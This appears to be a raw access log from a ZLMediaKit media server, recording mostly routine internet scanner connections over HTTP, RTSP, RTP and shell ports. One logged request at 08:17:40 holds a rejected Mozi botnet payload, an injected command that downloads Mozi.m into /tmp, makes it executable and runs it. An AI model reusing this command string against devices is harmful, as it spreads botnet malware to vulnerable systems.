+2024-08-23 05:28:05.969 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(180.163.28.143:53592) 
+2024-08-23 05:37:24.690 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950294368(205.210.31.104:59986) 
+2024-08-23 05:37:34.654 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(205.210.31.104:60224) 
+2024-08-23 05:37:46.778 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950294368(205.210.31.104:59986) end of file
+2024-08-23 05:37:46.778 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950294368(205.210.31.104:59986) 
+2024-08-23 05:37:46.779 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(205.210.31.104:60224) end of file
+2024-08-23 05:37:46.779 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(205.210.31.104:60224) 
+2024-08-23 05:52:09.229 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418288(199.45.154.120:55884) 
+2024-08-23 05:52:12.266 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418288(199.45.154.120:55884) connection reset by peer
+2024-08-23 05:52:12.266 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418288(199.45.154.120:55884) 
+2024-08-23 05:52:15.607 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418288(199.45.154.120:55928) 
+2024-08-23 05:52:25.665 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418288(199.45.154.120:55928) connection reset by peer
+2024-08-23 05:52:25.665 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418288(199.45.154.120:55928) 
+2024-08-23 05:55:56.962 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(185.224.128.59:43432) 
+2024-08-23 05:55:57.172 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(185.224.128.59:43432) end of file
+2024-08-23 05:55:57.173 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(185.224.128.59:43432) 
+2024-08-23 06:12:58.446 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(93.174.93.12:60000) 
+2024-08-23 06:13:34.012 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(93.174.93.12:60000) connection reset by peer
+2024-08-23 06:13:34.012 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(93.174.93.12:60000) 
+2024-08-23 06:18:33.484 D MediaServer[22196-event poller 2] RtspSession.cpp:53 RtspSession | 140493950300016(142.4.218.114:44465) 
+2024-08-23 06:18:44.307 W MediaServer[22196-event poller 2] RtspSession.cpp:65 onError | 140493950300016(142.4.218.114:44465) RTSP播放器(__defaultVhost__//)断开:end of file,耗时(s):10
+2024-08-23 06:18:44.307 D MediaServer[22196-event poller 2] RtspSession.cpp:59 ~RtspSession | 140493950300016(142.4.218.114:44465) 
+2024-08-23 06:23:04.372 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(198.235.24.132:49772) 
+2024-08-23 06:23:36.640 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(198.235.24.132:49772) connection reset by peer
+2024-08-23 06:23:36.640 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(198.235.24.132:49772) 
+2024-08-23 06:34:24.211 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(46.174.191.32:28586) 
+2024-08-23 06:34:56.486 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(46.174.191.32:28586) connection reset by peer
+2024-08-23 06:34:56.486 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(46.174.191.32:28586) 
+2024-08-23 06:39:43.576 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(35.203.211.29:59328) 
+2024-08-23 06:39:43.830 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(35.203.211.29:59328) end of file
+2024-08-23 06:39:43.830 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(35.203.211.29:59328) 
+2024-08-23 06:52:18.337 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950300016(205.210.31.222:65502) 
+2024-08-23 06:52:28.336 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950300976(205.210.31.222:61478) 
+2024-08-23 06:52:28.422 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 06:52:28.422 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950300016(205.210.31.222:65502) 
+2024-08-23 06:52:38.426 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 06:52:38.426 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950300976(205.210.31.222:61478) 
+2024-08-23 07:13:07.323 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(185.224.128.84:44718) 
+2024-08-23 07:13:07.763 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(185.224.128.84:44718) end of file
+2024-08-23 07:13:07.763 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(185.224.128.84:44718) 
+2024-08-23 07:13:38.110 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950300912(45.156.129.48:39442) 
+2024-08-23 07:13:45.935 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950300912(45.156.129.48:39442) end of file
+2024-08-23 07:13:45.935 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950300912(45.156.129.48:39442) 
+2024-08-23 07:27:10.387 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(47.236.251.7:50798) 
+2024-08-23 07:27:17.762 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(47.236.251.7:52222) 
+2024-08-23 07:27:17.763 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(47.236.251.7:52222) close connection after send http body completed.
+2024-08-23 07:27:17.763 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(47.236.251.7:52222) 
+2024-08-23 07:27:18.190 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(47.236.251.7:50798) end of file
+2024-08-23 07:27:18.190 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(47.236.251.7:50798) 
+2024-08-23 07:27:36.900 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(47.236.251.7:37314) 
+2024-08-23 07:27:44.695 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(47.236.251.7:37314) end of file
+2024-08-23 07:27:44.695 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(47.236.251.7:37314) 
+2024-08-23 07:27:58.363 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(68.183.80.103:38480) 
+2024-08-23 07:27:59.251 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(68.183.80.103:38480) end of file
+2024-08-23 07:27:59.251 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(68.183.80.103:38480) 
+2024-08-23 07:27:59.567 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(68.183.80.103:38488) 
+2024-08-23 07:28:01.136 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(68.183.80.103:38488) end of file
+2024-08-23 07:28:01.136 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(68.183.80.103:38488) 
+2024-08-23 07:28:01.396 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(68.183.80.103:38498) 
+2024-08-23 07:28:02.782 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(68.183.80.103:38498) end of file
+2024-08-23 07:28:02.782 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(68.183.80.103:38498) 
+2024-08-23 07:28:03.099 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(68.183.80.103:38500) 
+2024-08-23 07:28:04.663 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(68.183.80.103:38500) end of file
+2024-08-23 07:28:04.663 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(68.183.80.103:38500) 
+2024-08-23 07:28:04.966 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(68.183.80.103:38506) 
+2024-08-23 07:28:05.877 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(68.183.80.103:38506) end of file
+2024-08-23 07:28:05.877 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(68.183.80.103:38506) 
+2024-08-23 07:28:06.130 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(68.183.80.103:56506) 
+2024-08-23 07:28:06.957 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(68.183.80.103:56506) end of file
+2024-08-23 07:28:06.957 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(68.183.80.103:56506) 
+2024-08-23 07:31:47.438 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(45.79.160.98:18054) 
+2024-08-23 07:31:47.641 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(45.79.160.98:18054) end of file
+2024-08-23 07:31:47.641 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(45.79.160.98:18054) 
+2024-08-23 08:01:50.325 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.79:39165) 
+2024-08-23 08:01:50.774 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.79:39165) end of file
+2024-08-23 08:01:50.774 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.79:39165) 
+2024-08-23 08:05:09.621 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.77:64142) 
+2024-08-23 08:05:10.456 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.77:64142) end of file
+2024-08-23 08:05:10.456 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.77:64142) 
+2024-08-23 08:05:40.550 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.77:49204) 
+2024-08-23 08:05:40.742 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.77:49204) end of file
+2024-08-23 08:05:40.742 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.77:49204) 
+2024-08-23 08:06:35.190 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.78:30149) 
+2024-08-23 08:06:35.190 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:35.824 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.78:30149) end of file
+2024-08-23 08:06:35.824 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.78:30149) 
+2024-08-23 08:06:35.957 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.90:6691) 
+2024-08-23 08:06:35.957 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:36.591 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.90:6691) end of file
+2024-08-23 08:06:36.591 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.90:6691) 
+2024-08-23 08:06:36.803 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.85:40543) 
+2024-08-23 08:06:36.803 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:37.475 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.85:40543) end of file
+2024-08-23 08:06:37.475 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.85:40543) 
+2024-08-23 08:06:37.569 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.86:12331) 
+2024-08-23 08:06:37.569 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:38.203 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.86:12331) end of file
+2024-08-23 08:06:38.203 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.86:12331) 
+2024-08-23 08:06:38.333 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.84:8201) 
+2024-08-23 08:06:38.333 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:38.964 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.84:8201) end of file
+2024-08-23 08:06:38.965 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.84:8201) 
+2024-08-23 08:06:39.101 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.84:55787) 
+2024-08-23 08:06:39.101 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:39.735 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.84:55787) end of file
+2024-08-23 08:06:39.735 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.84:55787) 
+2024-08-23 08:06:39.864 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.80:9133) 
+2024-08-23 08:06:39.864 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:40.495 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.80:9133) end of file
+2024-08-23 08:06:40.495 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.80:9133) 
+2024-08-23 08:06:40.710 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.85:9355) 
+2024-08-23 08:06:40.710 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:41.383 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.85:9355) end of file
+2024-08-23 08:06:41.383 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.85:9355) 
+2024-08-23 08:06:41.476 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.91:11409) 
+2024-08-23 08:06:41.477 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:42.110 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.91:11409) end of file
+2024-08-23 08:06:42.110 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.91:11409) 
+2024-08-23 08:06:42.241 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.90:28053) 
+2024-08-23 08:06:42.242 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 08:06:42.874 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.90:28053) end of file
+2024-08-23 08:06:42.874 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.90:28053) 
+2024-08-23 08:09:22.177 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.82:37599) 
+2024-08-23 08:09:22.603 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.82:37599) end of file
+2024-08-23 08:09:22.603 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.82:37599) 
+2024-08-23 08:10:30.433 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.91:47747) 
+2024-08-23 08:10:30.568 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.91:47747) end of file
+2024-08-23 08:10:30.568 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.91:47747) 
+2024-08-23 08:13:46.347 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.82:40329) 
+2024-08-23 08:13:46.777 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.82:40329) end of file
+2024-08-23 08:13:46.777 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.82:40329) 
+2024-08-23 08:17:39.939 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(115.55.232.103:35839) 
+2024-08-23 08:17:40.641 W MediaServer[22196-event poller 2] HttpSession.cpp:66 onRecvHeader | 140493950297664(115.55.232.103:35839) 不支持该命令:20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Netlink.m;chmod%20777%20/tmp/Netlink.m;/tmp/Netlink.m&waninf=1_INTERNET_R_VID_154
+2024-08-23 08:17:40.642 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(115.55.232.103:35839) close connection after send http header completed with status code:405
+2024-08-23 08:17:40.642 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(115.55.232.103:35839) 
+2024-08-23 08:38:19.495 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(34.76.5.140:59444) 
+2024-08-23 08:38:20.248 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(34.76.5.140:59444) end of file
+2024-08-23 08:38:20.249 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(34.76.5.140:59444) 
+2024-08-23 08:40:08.669 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(185.224.128.59:34310) 
+2024-08-23 08:40:08.927 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(185.224.128.59:34310) end of file
+2024-08-23 08:40:08.927 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(185.224.128.59:34310) 
+2024-08-23 08:56:59.421 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(95.214.55.138:48714) 
+2024-08-23 08:57:09.421 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(95.214.55.138:48714) end of file
+2024-08-23 08:57:09.421 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(95.214.55.138:48714) 
+2024-08-23 09:16:55.797 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(42.192.66.53:51176) 
+2024-08-23 09:16:55.798 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(42.192.66.53:51176) end of file
+2024-08-23 09:16:55.798 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(42.192.66.53:51176) 
+2024-08-23 09:31:15.593 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(120.233.33.214:3168) 
+2024-08-23 09:31:46.126 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(120.233.33.214:3168) session timeout
+2024-08-23 09:31:46.126 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(120.233.33.214:3168) 
+2024-08-23 09:49:57.838 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(185.180.140.6:55988) 
+2024-08-23 09:50:05.667 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(185.180.140.6:55988) end of file
+2024-08-23 09:50:05.667 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(185.180.140.6:55988) 
+2024-08-23 10:16:45.008 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418432(83.222.190.78:65451) 
+2024-08-23 10:16:45.272 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418432(83.222.190.78:65451) connection reset by peer
+2024-08-23 10:16:45.272 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418432(83.222.190.78:65451) 
+2024-08-23 10:22:52.733 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(185.224.128.84:56674) 
+2024-08-23 10:22:52.964 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(185.224.128.84:56674) end of file
+2024-08-23 10:22:52.964 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(185.224.128.84:56674) 
+2024-08-23 10:27:55.902 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950417664(199.45.154.126:58538) 
+2024-08-23 10:27:58.909 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950417664(199.45.154.126:58538) connection reset by peer
+2024-08-23 10:27:58.909 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950417664(199.45.154.126:58538) 
+2024-08-23 10:28:02.682 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950417664(199.45.154.126:39970) 
+2024-08-23 10:28:12.775 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950417664(199.45.154.126:39970) connection reset by peer
+2024-08-23 10:28:12.775 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950417664(199.45.154.126:39970) 
+2024-08-23 10:33:34.365 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(185.224.128.59:60080) 
+2024-08-23 10:33:34.554 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(185.224.128.59:60080) connection reset by peer
+2024-08-23 10:33:34.554 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(185.224.128.59:60080) 
+2024-08-23 10:50:39.742 D MediaServer[22196-event poller 2] RtspSession.cpp:53 RtspSession | 140493950419904(205.210.31.254:49640) 
+2024-08-23 10:50:42.216 W MediaServer[22196-event poller 2] RtspSession.cpp:65 onError | 140493950419904(205.210.31.254:49640) RTSP播放器(__defaultVhost__//)断开:end of file,耗时(s):2
+2024-08-23 10:50:42.216 D MediaServer[22196-event poller 2] RtspSession.cpp:59 ~RtspSession | 140493950419904(205.210.31.254:49640) 
+2024-08-23 10:52:22.083 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:41686) 
+2024-08-23 10:52:25.219 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:41686) connection reset by peer
+2024-08-23 10:52:25.220 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:41686) 
+2024-08-23 10:52:25.408 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:56660) 
+2024-08-23 10:52:29.137 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:56660) connection reset by peer
+2024-08-23 10:52:29.137 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:56660) 
+2024-08-23 10:52:32.871 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:56694) 
+2024-08-23 10:52:33.724 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:56694) end of file
+2024-08-23 10:52:33.724 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:56694) 
+2024-08-23 10:52:33.973 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:56698) 
+2024-08-23 10:52:34.538 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:56698) close connection after send http body completed.
+2024-08-23 10:52:34.538 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:56698) 
+2024-08-23 10:52:35.003 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:33250) 
+2024-08-23 10:52:35.402 W MediaServer[22196-event poller 2] HttpSession.cpp:66 onRecvHeader | 140493950290304(206.168.34.52:33250) 不支持该命令:PRI
+2024-08-23 10:52:35.402 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:33250) close connection after send http header completed with status code:405
+2024-08-23 10:52:35.402 W MediaServer[22196-event poller 2] HttpSession.cpp:66 onRecvHeader | 140493950290304(206.168.34.52:33250) 不支持该命令:
+2024-08-23 10:52:35.402 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:33250) 
+2024-08-23 10:52:37.227 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:33252) 
+2024-08-23 10:52:37.926 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:33252) connection reset by peer
+2024-08-23 10:52:37.926 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:33252) 
+2024-08-23 10:52:39.648 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:33272) 
+2024-08-23 10:52:40.169 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:33272) connection reset by peer
+2024-08-23 10:52:40.169 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:33272) 
+2024-08-23 10:52:44.572 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(206.168.34.52:33280) 
+2024-08-23 10:52:45.084 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(206.168.34.52:33280) connection reset by peer
+2024-08-23 10:52:45.085 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(206.168.34.52:33280) 
+2024-08-23 11:12:20.178 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(205.210.31.205:61208) 
+2024-08-23 11:12:21.112 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(205.210.31.205:61208) end of file
+2024-08-23 11:12:21.112 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(205.210.31.205:61208) 
+2024-08-23 11:27:33.818 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950415248(147.185.132.22:62392) 
+2024-08-23 11:27:34.085 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950415248(147.185.132.22:62392) connection reset by peer
+2024-08-23 11:27:34.085 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950415248(147.185.132.22:62392) 
+2024-08-23 11:33:00.360 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950415248(35.176.98.149:21933) 
+2024-08-23 11:33:25.317 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950407248(35.176.98.149:52312) 
+2024-08-23 11:33:25.809 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950407248(35.176.98.149:52312) end of file
+2024-08-23 11:33:25.809 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950407248(35.176.98.149:52312) 
+2024-08-23 11:34:11.736 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950407248(35.176.98.149:42108) 
